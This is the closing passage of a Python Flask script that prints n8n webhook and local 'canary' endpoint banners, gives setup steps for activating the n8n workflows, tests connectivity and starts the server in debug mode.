    print(f"🪝 n8n Canary: {N8N_QUERY_WEBHOOK}")
    print(f"🔍 n8n Query: {N8N_QUERY_WEBHOOK}")
    print(f"🛡️  Fallback Canary: http://127.0.0.1:5000/canary")
    print("="*70)
    print("\n⚠️  IMPORTANT: Make sure both n8n workflows are ACTIVE (not listening)")
    print("   1. Open n8n and find your workflows")
    print("   2. Click the toggle switch in top-right to make it GREEN/ACTIVE")
    print("   3. It should say 'Active' not 'Inactive' or 'Waiting for trigger'")
    print("   4. Copy the Production URL from each webhook node")
    print("   5. Update N8N_QUERY_WEBHOOK and N8N_QUERY_WEBHOOK above")
    print("="*70 + "\n")
    
    # Test n8n connectivity on startup
    test_n8n_connectivity()
    
    app.run(host="0.0.0.0", port=5000, debug=True)
